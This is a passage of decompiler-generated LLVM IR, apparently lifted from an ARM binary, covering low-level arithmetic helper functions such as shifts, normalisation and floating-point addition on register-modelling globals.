  uselistorder i32 %v4_151a8, { 2, 1, 0 }
  uselistorder i32 %v3_151a4, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_1518c, { 1, 0 }
  uselistorder i32 %v2_15184, { 1, 3, 0, 2 }
  uselistorder i32 %v2_15180, { 1, 3, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder label %dec_label_pc_1520c, { 1, 0 }
  uselistorder label %dec_label_pc_151f4, { 1, 0 }
  uselistorder label %dec_label_pc_151d0, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15214() local_unnamed_addr {
dec_label_pc_15214:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_15214 = load i32, i32* @r4, align 4
  %v1_15214 = add i32 %v0_15214, -1
  store i32 %v1_15214, i32* @r4, align 4
  %v0_15218 = load i32, i32* @r5, align 4
  %v1_15218 = sub i32 32, %v0_15218
  %v5_1521c = icmp sgt i32 %v0_15218, 32
  br i1 %v5_1521c, label %dec_label_pc_15238, label %dec_label_pc_15220

dec_label_pc_15220:                               ; preds = %dec_label_pc_15214
  %v0_15220 = load i32, i32* @r3, align 4
  %v6_15220 = shl i32 %v0_15220, %v1_15218
  store i32 %v6_15220, i32* %ip.global-to-local, align 4
  %v0_15224 = load i32, i32* @r1, align 4
  %v3_15224 = add i32 %v0_15218, -1
  %v4_15224 = shl i32 1, %v3_15224
  %v7_15224 = lshr i32 %v0_15220, %v0_15218
  %v8_15224 = add i32 %v0_15224, %v7_15224
  %v9_15224 = icmp ult i32 %v8_15224, %v0_15224
  %v0_15228 = load i32, i32* @r0, align 4
  %v2_15228 = zext i1 %v9_15224 to i32
  %v3_15228 = add i32 %v2_15228, %v0_15228
  %v1_1522c = load i32, i32* @r2, align 4
  %v7_1522c = shl i32 %v1_1522c, %v1_15218
  %v8_1522c = add i32 %v7_1522c, %v8_15224
  store i32 %v8_1522c, i32* %r1.global-to-local, align 4
  %v5_15230 = and i32 %v1_1522c, %v4_15224
  %v6_15230 = icmp ne i32 %v5_15230, 0
  %v7_15230 = ashr i32 %v1_1522c, %v0_15218
  %v9_15230 = add i32 %v3_15228, %v7_15230
  %v10_15230 = zext i1 %v6_15230 to i32
  %v11_15230 = add i32 %v10_15230, %v9_15230
  br label %dec_label_pc_15254

dec_label_pc_15238:                               ; preds = %dec_label_pc_15214
  %v1_15238 = add i32 %v0_15218, -32
  %v1_1523c = add i32 %v1_15218, 32
  %v0_15244 = load i32, i32* @r2, align 4
  %v2_15244 = add i32 %v1_15218, 31
  %v3_15244 = lshr i32 -2147483648, %v2_15244
  %v4_15244 = and i32 %v0_15244, %v3_15244
  %v5_15244 = icmp ne i32 %v4_15244, 0
  %v6_15244 = shl i32 %v0_15244, %v1_1523c
  %v2_15248 = or i32 %v6_15244, 2
  %v2_15248.v6_15244 = select i1 %v5_15244, i32 %v2_15248, i32 %v6_15244
  store i32 %v2_15248.v6_15244, i32* %ip.global-to-local, align 4
  %v0_1524c = load i32, i32* @r1, align 4
  %v7_1524c = ashr i32 %v0_15244, %v1_15238
  %v8_1524c = add i32 %v0_1524c, %v7_1524c
  store i32 %v8_1524c, i32* %r1.global-to-local, align 4
  %v0_15250 = load i32, i32* @r0, align 4
  %v2_15250 = and i32 %v0_15244, 1073741824
  %v3_15250 = icmp ne i32 %v2_15250, 0
  %v4_15250 = ashr i32 %v0_15244, 31
  %v6_15250 = add i32 %v0_15250, %v4_15250
  %v7_15250 = zext i1 %v3_15250 to i32
  %v8_15250 = add i32 %v6_15250, %v7_15250
  br label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %dec_label_pc_15220, %dec_label_pc_15238
  %storemerge = phi i32 [ %v11_15230, %dec_label_pc_15220 ], [ %v8_15250, %dec_label_pc_15238 ]
  %v0_15254 = phi i32 [ %v11_15230, %dec_label_pc_15220 ], [ %v8_15250, %dec_label_pc_15238 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_15254 = and i32 %v0_15254, -2147483648
  store i32 %v1_15254, i32* @r5, align 4
  %v1_15258 = icmp sgt i32 %v0_15254, -1
  call void @__pseudo_cond_branch(i1 %v1_15258, i32 ptrtoint (i32* @global_var_15268.639 to i32))
  %v0_1525c = load i32, i32* %ip.global-to-local, align 4
  %v1_1525c = sub i32 0, %v0_1525c
  store i32 %v1_1525c, i32* %ip.global-to-local, align 4
  %v2_1525c = icmp eq i32 %v0_1525c, 0
  %v0_15260 = load i32, i32* %r1.global-to-local, align 4
  %v2_15260 = icmp eq i1 %v2_1525c, false
  %v5_15260 = sext i1 %v2_15260 to i32
  %v6_15260 = sub i32 %v5_15260, %v0_15260
  store i32 %v6_15260, i32* @r1, align 4
  %v7_15260 = zext i1 %v2_15260 to i32
  %v8_15260 = icmp ne i32 %v6_15260, %v7_15260
  %v9_15260 = icmp ne i32 %v0_15260, -1
  %v10_15260 = or i1 %v9_15260, %v8_15260
  %v11_15260 = icmp ne i32 %v0_15260, 0
  %v12_15260 = select i1 %v2_15260, i1 %v10_15260, i1 %v11_15260
  %v0_15264 = load i32, i32* %r0.global-to-local, align 4
  %v5_15264 = sext i1 %v12_15260 to i32
  %v6_15264 = sub i32 %v5_15264, %v0_15264
  store i32 %v6_15264, i32* %r0.global-to-local, align 4
  ret i32 %v6_15264

; uselistorder directives
  uselistorder i1 %v2_15260, { 1, 2, 0 }
  uselistorder i32 %v0_15260, { 1, 2, 0 }
  uselistorder i32 %v8_15250, { 1, 0 }
  uselistorder i32 %v0_15244, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_15230, { 1, 0 }
  uselistorder i32 %v1_1522c, { 1, 0, 2 }
  uselistorder i32 %v0_15224, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_15254, { 1, 0 }
}

define i32 @function_15268(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15268:
  %r0.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1526c = icmp ult i32 %arg1, 1048574
  br i1 %v3_1526c, label %dec_label_pc_152ac, label %dec_label_pc_15270

dec_label_pc_15270:                               ; preds = %dec_label_pc_15268
  %v3_15274 = icmp ult i32 %arg1, 2097150
  br i1 %v3_15274, label %dec_label_pc_15294, label %dec_label_pc_15278

dec_label_pc_15278:                               ; preds = %dec_label_pc_15270
  %v1_15278 = urem i32 %arg1, 2
  %v2_15278 = icmp ne i32 %v1_15278, 0
  %v3_15278 = udiv i32 %arg1, 2
  store i32 %v3_15278, i32* %r0.global-to-local, align 4
  %v0_1527c = load i32, i32* @r1, align 4
  %v3_1527c = zext i1 %v2_15278 to i32
  %v6_1527c = zext i32 %v0_1527c to i64
  %v7_1527c = sub i32 33, %v0_1527c
  %v8_1527c = zext i32 %v7_1527c to i64
  %v9_1527c = shl i64 %v6_1527c, %v8_1527c
  %v10_1527c = sub i32 32, %v0_1527c
  %v11_1527c = shl i32 %v3_1527c, %v10_1527c
  %v12_1527c = zext i32 %v11_1527c to i64
  %v14_1527c = or i64 %v12_1527c, %v9_1527c
  %v15_1527c = trunc i64 %v14_1527c to i32
  %v16_1527c = add i32 %v0_1527c, -1
  %v17_1527c = shl i32 1, %v16_1527c
  %v18_1527c = and i32 %v17_1527c, %v0_1527c
  %v19_1527c = icmp ne i32 %v18_1527c, 0
  store i32 %v15_1527c, i32* @r1, align 4
  %v0_15280 = load i32, i32* @ip, align 4
  %v3_15280 = zext i1 %v19_1527c to i32
  %v6_15280 = zext i32 %v0_15280 to i64
  %v7_15280 = sub i32 33, %v0_15280
  %v8_15280 = zext i32 %v7_15280 to i64
  %v9_15280 = shl i64 %v6_15280, %v8_15280
  %v10_15280 = sub i32 32, %v0_15280
  %v11_15280 = shl i32 %v3_15280, %v10_15280
  %v12_15280 = zext i32 %v11_15280 to i64
  %v14_15280 = or i64 %v12_15280, %v9_15280
  %v15_15280 = trunc i64 %v14_15280 to i32
  store i32 %v15_15280, i32* @ip, align 4
  %v0_15284 = load i32, i32* @r4, align 4
  %v1_15284 = add i32 %v0_15284, 1
  store i32 %v1_15284, i32* @r4, align 4
  %v3_15288 = mul i32 %v1_15284, 2097152
  %v2_1528c = icmp ugt i32 %v3_15288, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1528c, i32 ptrtoint (i32* @global_var_15420.640 to i32))
  br label %dec_label_pc_15294

dec_label_pc_15294:                               ; preds = %dec_label_pc_152ac, %dec_label_pc_15270, %dec_label_pc_15278
  %v0_15294 = load i32, i32* @ip, align 4
  %v2_15294 = icmp slt i32 %v0_15294, 0
  %v6_15294 = icmp eq i32 %v0_15294, -2147483648
  %v1_15298 = load i32, i32* @r1, align 4
  br i1 %v6_15294, label %bb, label %dec_label_pc_15294._crit_edge

bb:                                               ; preds = %dec_label_pc_15294
  %v2_15298 = urem i32 %v1_15298, 2
  %v3_15298 = icmp ne i32 %v2_15298, 0
  br label %dec_label_pc_15294._crit_edge

dec_label_pc_15294._crit_edge:                    ; preds = %dec_label_pc_15294, %bb
  %v1_1529c = phi i1 [ %v3_15298, %bb ], [ %v2_15294, %dec_label_pc_15294 ]
  %v2_1529c = zext i1 %v1_1529c to i32
  %v3_1529c = add i32 %v2_1529c, %v1_15298
  store i32 %v3_1529c, i32* @r1, align 4
  %v0_152a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_152a0 = load i32, i32* @r4, align 4
  %v2_152a0 = and i32 %v1_152a0, 4096
  %v3_152a0 = icmp ne i32 %v2_152a0, 0
  %v4_152a0 = mul i32 %v1_152a0, 1048576
  %v6_152a0 = add i32 %v4_152a0, %v0_152a0
  %v7_152a0 = zext i1 %v3_152a0 to i32
  %v8_152a0 = add i32 %v7_152a0, %v6_152a0
  %v1_152a4 = load i32, i32* @r5, align 4
  %v2_152a4 = or i32 %v1_152a4, %v8_152a0
  store i32 %v2_152a4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v2_152a4

dec_label_pc_152ac:                               ; preds = %dec_label_pc_15268
  %v0_152ac = load i32, i32* @ip, align 4
  %v1_152ac = icmp slt i32 %v0_152ac, 0
  %v2_152ac = mul i32 %v0_152ac, 2
  store i32 %v2_152ac, i32* @ip, align 4
  %v0_152b0 = load i32, i32* @r1, align 4
  %v3_152b0 = mul i32 %v0_152b0, 2
  %v4_152b0 = zext i1 %v1_152ac to i32
  %v5_152b0 = or i32 %v3_152b0, %v4_152b0
  store i32 %v5_152b0, i32* @r1, align 4
  %v9_152b0 = icmp ule i32 %v5_152b0, %v0_152b0
  %v10_152b0 = icmp ult i32 %v3_152b0, %v0_152b0
  %v11_152b0 = select i1 %v1_152ac, i1 %v9_152b0, i1 %v10_152b0
  %v3_152b4 = mul i32 %arg1, 2
  %v4_152b4 = zext i1 %v11_152b0 to i32
  %v5_152b4 = or i32 %v4_152b4, %v3_152b4
  store i32 %v5_152b4, i32* %r0.global-to-local, align 4
  %v1_152b8 = and i32 %v3_152b4, 1048576
  %v2_152b8 = icmp eq i32 %v1_152b8, 0
  %v0_152bc = load i32, i32* @r4, align 4
  %v1_152bc = add i32 %v0_152bc, -1
  store i32 %v1_152bc, i32* @r4, align 4
  br i1 %v2_152b8, label %bb7, label %dec_label_pc_15294

bb7:                                              ; preds = %dec_label_pc_152ac
  ret i32 %v5_152b4

; uselistorder directives
  uselistorder i32 %v0_152b0, { 1, 2, 0 }
  uselistorder i1 %v1_152ac, { 1, 0 }
  uselistorder i32 %v1_15298, { 1, 0 }
  uselistorder i32 %v0_15294, { 1, 0 }
  uselistorder i32 %v0_15280, { 1, 0, 2 }
  uselistorder i32 %v0_1527c, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15294._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15294, { 0, 2, 1 }
}

define i32 @function_152c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_152c4:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %v2_152c4 = icmp eq i32 %arg1, 0
  br i1 %v2_152c4, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_152c4
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_152c4
  %v1_152d010 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1532c = phi i32 [ %arg1, %bb ], [ %v1_152d010, %bb35 ]
  %v1_152e4 = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_152dc = icmp ugt i32 %v0_1532c, 65535
  br i1 %v2_152dc, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_152e0 = and i32 %v0_1532c, 32768
  %v3_152e0 = icmp eq i32 %v2_152e0, 0
  %v4_152e0 = udiv i32 %v0_1532c, 65536
  br i1 %v3_152e0, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_152e4 = add nsw i32 %v1_152e4, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_152f0 = phi i32 [ %v1_152e4, %.thread ], [ %v1_152e4, %bb36 ], [ %v2_152e4, %bb37 ]
  %v1_152ec = phi i32 [ %v0_1532c, %.thread ], [ %v4_152e0, %bb36 ], [ %v4_152e0, %bb37 ]
  %v2_152e8 = icmp ugt i32 %v1_152ec, 255
  br i1 %v2_152e8, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_152ec = and i32 %v1_152ec, 128
  %v3_152ec = icmp eq i32 %v2_152ec, 0
  %v4_152ec = udiv i32 %v1_152ec, 256
  br i1 %v3_152ec, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_152f0 = add nsw i32 %v1_152f0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_152fc = phi i32 [ %v1_152f0, %.thread3 ], [ %v1_152f0, %bb38 ], [ %v2_152f0, %bb39 ]
  %v1_152f8 = phi i32 [ %v1_152ec, %.thread3 ], [ %v4_152ec, %bb38 ], [ %v4_152ec, %bb39 ]
  %v2_152f4 = icmp ugt i32 %v1_152f8, 15
  br i1 %v2_152f4, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_152f8 = and i32 %v1_152f8, 8
  %v3_152f8 = icmp eq i32 %v2_152f8, 0
  %v4_152f8 = udiv i32 %v1_152f8, 16
  br i1 %v3_152f8, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_152fc = add nsw i32 %v1_152fc, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_15304 = phi i32 [ %v1_152fc, %.thread4 ], [ %v1_152fc, %bb40 ], [ %v2_152fc, %bb41 ]
  %v1_1530c = phi i32 [ %v1_152f8, %.thread4 ], [ %v4_152f8, %bb40 ], [ %v4_152f8, %bb41 ]
  %v2_15300 = icmp ugt i32 %v1_1530c, 3
  br i1 %v2_15300, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_15304 = add i32 %v1_15304, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_15308 = udiv i32 %v1_1530c, 2
  %v6_15308 = sub i32 %v1_15304, %v5_15308
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1530c = phi i32 [ %v6_15308, %.thread6 ], [ %v2_15304, %bb42 ]
  %v4_1530c = udiv i32 %v1_1530c, 8
  %v5_1530c = sub i32 %v0_1530c, %v4_1530c
  %v2_15310 = add i32 %v5_1530c, -32
  %v4_15310 = sub i32 31, %v5_1530c
  %v5_15310 = and i32 %v4_15310, %v5_1530c
  %v8_15310 = icmp eq i32 %v5_1530c, 32
  %v6_15314 = icmp slt i32 %v5_1530c, 32
  br i1 %v6_15314, label %dec_label_pc_15318, label %dec_label_pc_15338

dec_label_pc_15318:                               ; preds = %bb43
  %v2_15318 = add i32 %v5_1530c, -20
  %v7_1531c = icmp sgt i32 %v2_15310, -12
  br i1 %v7_1531c, label %dec_label_pc_15320, label %dec_label_pc_15334

dec_label_pc_15320:                               ; preds = %dec_label_pc_15318
  store i32 %v5_1530c, i32* @ip, align 4
  %v1_15324 = sub i32 32, %v5_1530c
  %v6_15328 = shl i32 %v0_1532c, %v5_1530c
  store i32 %v6_15328, i32* @r1, align 4
  %v6_1532c = lshr i32 %v0_1532c, %v1_15324
  br label %.thread31

dec_label_pc_15334:                               ; preds = %dec_label_pc_15318
  %v8_15318 = icmp eq i32 %v2_15318, 0
  %v4_15318 = add i32 %v5_1530c, 2147483616
  %v5_15318 = and i32 %v2_15318, %v4_15318
  br label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %bb43, %dec_label_pc_15334
  %v1_15344.in = phi i32 [ %v2_15310, %bb43 ], [ %v2_15318, %dec_label_pc_15334 ]
  %v6_15344 = phi i32 [ %v2_15310, %bb43 ], [ %v5_1530c, %dec_label_pc_15334 ]
  %v2_15344.in = phi i32 [ %v5_15310, %bb43 ], [ %v5_15318, %dec_label_pc_15334 ]
  %v0_15344 = phi i1 [ %v8_15310, %bb43 ], [ %v8_15318, %dec_label_pc_15334 ]
  %v1_15344 = icmp slt i32 %v1_15344.in, 0
  %v2_15344 = icmp slt i32 %v2_15344.in, 0
  %v3_15338 = xor i1 %v2_15344, %v1_15344
  %v4_15338 = or i1 %v0_15344, %v3_15338
  br i1 %v4_15338, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_15338
  %v6_15338 = sub i32 32, %v6_15344
  store i32 %v6_15338, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_15338, %bb44
  %v6_1533c = shl i32 %v0_1532c, %v6_15344
  br i1 %v4_15338, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_15340 = load i32, i32* @r1, align 4
  %v7_15340 = load i32, i32* @ip, align 4
  %v12_15340 = lshr i32 %v6_15340, %v7_15340
  %v13_15340 = or i32 %v12_15340, %v6_1533c
  %v11_15344 = shl i32 %v6_15340, %v6_15344
  store i32 %v11_15344, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_15320, %bb46
  %v1_15390 = phi i32 [ %v6_1532c, %dec_label_pc_15320 ], [ %v13_15340, %bb46 ], [ %v6_1533c, %bb45 ]
  %v0_15348 = load i32, i32* @r4, align 4
  %v2_15348 = sub i32 %v0_15348, %v5_1530c
  %v5_1534c = icmp slt i32 %v0_15348, %v5_1530c
  br i1 %v5_1534c, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1534c = mul i32 %v2_15348, 1048576
  %v11_1534c = add i32 %v10_1534c, %v1_15390
  %v7_15350 = load i32, i32* @r5, align 4
  %v8_15350 = or i32 %v7_15350, %v11_1534c
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_15350

bb48:                                             ; preds = %.thread31
  %v2_1535c = sub i32 -32, %v2_15348
  %v6_15360 = icmp sgt i32 %v2_15348, -32
  br i1 %v6_15360, label %dec_label_pc_15364, label %dec_label_pc_1539c

dec_label_pc_15364:                               ; preds = %bb48
  %v1_15364 = add i32 %v2_1535c, 12
  %v8_15368 = icmp sgt i32 %v1_15364, 0
  br i1 %v8_15368, label %dec_label_pc_15384, label %dec_label_pc_1536c

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15364
  %v1_1536c = add i32 %v2_1535c, 32
  %v1_15370 = sub i32 0, %v2_1535c
  %v0_15374 = load i32, i32* @r1, align 4
  %v6_15374 = lshr i32 %v0_15374, %v1_1536c
  %v7_15378 = shl i32 %v1_15390, %v1_15370
  %v8_15378 = or i32 %v6_15374, %v7_15378
  store i32 %v8_15378, i32* @r1, align 4
  %v0_1537c = load i32, i32* @r5, align 4
  %v7_1537c = lshr i32 %v1_15390, %v1_1536c
  %v8_1537c = or i32 %v0_1537c, %v7_1537c
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_1537c

dec_label_pc_15384:                               ; preds = %dec_label_pc_15364
  %v1_15384 = sub i32 0, %v2_1535c
  %v1_15388 = add i32 %v2_1535c, 32
  %v0_1538c = load i32, i32* @r1, align 4
  %v6_1538c = lshr i32 %v0_1538c, %v1_15388
  %v7_15390 = shl i32 %v1_15390, %v1_15384
  %v8_15390 = or i32 %v6_1538c, %v7_15390
  store i32 %v8_15390, i32* @r1, align 4
  %v0_15394 = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_15394

dec_label_pc_1539c:                               ; preds = %bb48
  %v6_1539c = lshr i32 %v1_15390, %v2_1535c
  store i32 %v6_1539c, i32* @r1, align 4
  %v0_153a0 = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_153a0

; uselistorder directives
  uselistorder i32 %v2_1535c, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v2_15348, { 1, 0, 2 }
  uselistorder i32 %v1_15390, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v6_1533c, { 1, 0 }
  uselistorder i32 %v2_15310, { 1, 0, 2 }
  uselistorder i32 %v5_1530c, { 5, 4, 6, 2, 8, 1, 7, 3, 9, 10, 0, 12, 11 }
  uselistorder i32 %v4_152f8, { 1, 0 }
  uselistorder i32 %v1_152f8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_152ec, { 1, 0 }
  uselistorder i32 %v1_152ec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_152e0, { 1, 0 }
  uselistorder i32 %v0_1532c, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp33, { 3, 2, 1, 0 }
  uselistorder i32 %tmp32, { 3, 2, 1, 0 }
  uselistorder i32 -12, { 0, 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 14, 3, 5, 6, 4, 15, 7, 11, 8, 0, 13, 12, 16, 1, 9, 2, 10, 17, 18 }
  uselistorder i32 15, { 3, 4, 5, 1, 6, 2, 0 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 22, 15, 14, 6, 13, 12, 11, 10, 23, 24, 25, 26, 7, 27, 28, 2, 0, 31, 9, 29, 30, 1, 33, 34, 3, 8, 4, 5, 32 }
  uselistorder i32 128, { 14, 13, 12, 6, 7, 9, 5, 21, 0, 22, 23, 1, 8, 10, 16, 17, 18, 2, 3, 11, 19, 20, 4, 15 }
  uselistorder i32 255, { 7, 8, 9, 12, 3, 10, 0, 1, 13, 4, 5, 6, 11, 2 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 6, 5, 4, 1, 17, 18, 19, 20, 21, 22, 3, 2, 0, 23 }
  uselistorder i32 65535, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32 52, { 0, 8, 4, 6, 9, 5, 3, 10, 11, 2, 1, 7 }
  uselistorder i32 20, { 3, 22, 23, 24, 32, 0, 25, 35, 4, 36, 1, 5, 33, 8, 26, 27, 17, 9, 19, 2, 10, 28, 29, 30, 31, 18, 34, 11, 20, 12, 7, 6, 13, 21, 14, 15, 16 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_15338, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_153a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_153a8:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_153a8 = load i32, i32* @r4, align 4
  %v2_153a8 = icmp eq i32 %v0_153a8, 0
  %v1_153ac = xor i32 %arg3, 1048576
  store i32 %v1_153ac, i32* @r2, align 4
  br i1 %v2_153a8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_153a8
  %v2_153b0 = xor i32 %arg1, 1048576
  store i32 %v2_153b0, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_153a8
  %v1_153b8 = load i32, i32* @r5, align 4
  %v2_153b8 = add i32 %v1_153b8, -1
  store i32 %v2_153b8, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_153bc = call i32 @function_15214()
  %v0_153c0 = load i32, i32* @r4, align 4
  %v0_153c0.off = add i32 %v0_153c0, 4194303
  %tmp = icmp ult i32 %v0_153c0.off, 2097152
  %v1_1543c = load i32, i32* @r5, align 4
  %v1_1543c.off = add i32 %v1_1543c, 4194303
  %tmp45 = icmp ult i32 %v1_1543c.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %bb33
  %v4_153cc = icmp eq i32 %v1_1543c, %v0_153c0
  %v1_153d0 = load i32, i32* @r1, align 4
  br i1 %v4_153cc, label %bb34, label %dec_label_pc_153d8

bb34:                                             ; preds = %dec_label_pc_153cc
  %v2_153d0 = load i32, i32* @r3, align 4
  %v5_153d0 = icmp eq i32 %v2_153d0, %v1_153d0
  br i1 %v5_153d0, label %dec_label_pc_153e8, label %dec_label_pc_153d8

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153cc, %bb34
  %v2_153d8 = or i32 %v1_153d0, %v0_153c0
  %v4_153d8 = icmp eq i32 %v2_153d8, 0
  br i1 %v4_153d8, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_153d8
  %v1_153dc = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_153d8, %bb35
  %v11_153e4 = phi i32 [ %v0_153bc, %dec_label_pc_153d8 ], [ %v1_153dc, %bb35 ]
  ret i32 %v11_153e4

dec_label_pc_153e8:                               ; preds = %bb34
  %v1_153e8 = load i32, i32* @r2, align 4
  %v4_153e8 = icmp eq i32 %v1_153e8, %v0_153bc
  br i1 %v4_153e8, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_153e8
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_153e8
  %tmp46 = icmp ult i32 %v0_153c0, 2097152
  br i1 %tmp46, label %dec_label_pc_15400, label %dec_label_pc_15410

dec_label_pc_15400:                               ; preds = %.thread8
  %v1_15400 = icmp slt i32 %v1_153d0, 0
  %v3_15404 = mul i32 %v0_153bc, 2
  %v4_15404 = zext i1 %v1_15400 to i32
  %v5_15404 = or i32 %v4_15404, %v3_15404
  %v9_15404 = icmp ule i32 %v5_15404, %v0_153bc
  %v10_15404 = icmp ult i32 %v3_15404, %v0_153bc
  %v11_15404 = select i1 %v1_15400, i1 %v9_15404, i1 %v10_15404
  br i1 %v11_15404, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_15400
  %v2_15408 = or i32 %v5_15404, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_15400, %bb37
  %v11_1540c = phi i32 [ %v5_15404, %dec_label_pc_15400 ], [ %v2_15408, %bb37 ]
  ret i32 %v11_1540c

dec_label_pc_15410:                               ; preds = %.thread8
  %v2_15410 = icmp ugt i32 %v0_153c0, -4194305
  br i1 %v2_15410, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_15410
  %v2_15414 = add i32 %v0_153bc, 1048576
  ret i32 %v2_15414

.thread9:                                         ; preds = %dec_label_pc_15410
  %v1_1541c = and i32 %v0_153bc, -2147483648
  %v1_15424 = or i32 %v1_1541c, 2146435072
  ret i32 %v1_15424

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_15448.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_153bc, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_15434 = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1544827 = phi i32 [ %v0_153bc, %.thread14 ], [ %v1_15434, %bb40 ]
  %v1_15444.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_15444 = load i32, i32* %v1_15444.in, align 4
  store i32 %v1_15444, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
